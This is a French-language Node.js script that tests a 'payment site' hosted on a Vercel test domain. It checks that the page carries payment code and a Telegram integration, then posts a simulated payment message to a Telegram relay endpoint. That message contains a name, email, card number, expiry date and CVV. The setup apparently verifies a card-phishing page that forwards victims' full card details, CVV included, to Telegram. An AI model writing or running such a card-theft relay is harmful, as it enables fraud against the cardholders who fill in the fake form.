const fetch = require('node-fetch');

console.log('🔍 DIAGNOSTIC DU SITE DE PAIEMENT');
console.log('=================================');

const CONFIG = {
    SITE_URL: 'https://test-alpha-lac-68.vercel.app',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    NOTIFICATIONS_API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications'
};

// Fonction pour tester la page principale
async function testMainSite() {
    try {
        console.log('🌐 Test de la page principale...');
        const response = await fetch(CONFIG.SITE_URL);
        
        if (response.ok) {
            const html = await response.text();
            console.log('✅ Page principale accessible');
            console.log(`📄 Taille: ${html.length} caractères`);
            
            // Vérifier si le code de paiement est présent
            if (html.includes('paiement') || html.includes('payment')) {
                console.log('✅ Code de paiement détecté dans la page');
            } else {
                console.log('⚠️  Code de paiement non détecté dans la page');
            }
            
            // Vérifier si l'API Telegram est intégrée
            if (html.includes('api/telegram')) {
                console.log('✅ Intégration API Telegram détectée');
            } else {
                console.log('⚠️  Intégration API Telegram non détectée');
            }
            
            return true;
        } else {
            console.log(`❌ Erreur page principale: ${response.status}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Erreur connexion page principale: ${error.message}`);
        return false;
    }
}

// Fonction pour tester l'API Telegram
async function testTelegramAPI() {
    try {
        console.log('📱 Test de l\'API Telegram...');
        
        const testMessage = `🔍 TEST DIAGNOSTIC SITE
📅 Date: ${new Date().toLocaleString()}
🌐 Site: ${CONFIG.SITE_URL}
✅ API Telegram fonctionnelle`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: testMessage,
                type: 'diagnostic'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ API Telegram fonctionnelle');
            console.log(`📱 Message ID: ${result.telegramResponse?.result?.message_id}`);
            return true;
        } else {
            console.log(`❌ Erreur API Telegram: ${result.error}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Erreur connexion API Telegram: ${error.message}`);
        return false;
    }
}

// Fonction pour tester l'API Notifications
async function testNotificationsAPI() {
    try {
        console.log('📨 Test de l\'API Notifications...');
        
        const response = await fetch(CONFIG.NOTIFICATIONS_API_URL);
        const data = await response.json();
        
        if (data.success) {
            console.log('✅ API Notifications fonctionnelle');
            console.log(`📊 Notifications stockées: ${data.notifications?.length || 0}`);
            return true;
        } else {
            console.log(`❌ Erreur API Notifications: ${data.error}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Erreur connexion API Notifications: ${error.message}`);
        return false;
    }
}

// Fonction pour simuler un paiement
async function simulatePayment() {
    try {
        console.log('💳 Simulation d\'un paiement...');
        
        const paymentMessage = `💰 SIMULATION PAIEMENT DIAGNOSTIC
👤 Nom: Test Diagnostic
📧 Email: test@diagnostic.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: paymentMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Simulation paiement réussie');
            console.log(`📱 Message ID: ${result.telegramResponse?.result?.message_id}`);
            return true;
        } else {
            console.log(`❌ Erreur simulation paiement: ${result.error}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Erreur simulation paiement: ${error.message}`);
        return false;
    }
}

// Fonction principale
async function runDiagnostic() {
    console.log('🚀 Démarrage du diagnostic...\n');
    
    const results = {
        mainSite: await testMainSite(),
        telegramAPI: await testTelegramAPI(),
        notificationsAPI: await testNotificationsAPI(),
        paymentSimulation: await simulatePayment()
    };
    
    console.log('\n📊 RÉSULTATS DU DIAGNOSTIC');
    console.log('==========================');
    console.log(`🌐 Page principale: ${results.mainSite ? '✅ OK' : '❌ ERREUR'}`);
    console.log(`📱 API Telegram: ${results.telegramAPI ? '✅ OK' : '❌ ERREUR'}`);
    console.log(`📨 API Notifications: ${results.notificationsAPI ? '✅ OK' : '❌ ERREUR'}`);
    console.log(`💳 Simulation paiement: ${results.paymentSimulation ? '✅ OK' : '❌ ERREUR'}`);
    
    const allWorking = Object.values(results).every(result => result);
    
    if (allWorking) {
        console.log('\n🎉 TOUT FONCTIONNE CORRECTEMENT !');
        console.log('💡 Si les paiements ne marchent pas sur votre site, vérifiez :');
        console.log('   - Le cache de votre navigateur (Ctrl+F5 ou Cmd+Shift+R)');
        console.log('   - La console JavaScript (F12) pour des erreurs');
        console.log('   - Que le formulaire de paiement est bien rempli');
    } else {
        console.log('\n⚠️  CERTAINS ÉLÉMENTS NE FONCTIONNENT PAS');
        console.log('💡 Vérifiez les erreurs ci-dessus et contactez le support si nécessaire');
    }
}

// Exécuter le diagnostic
runDiagnostic().catch(console.error);
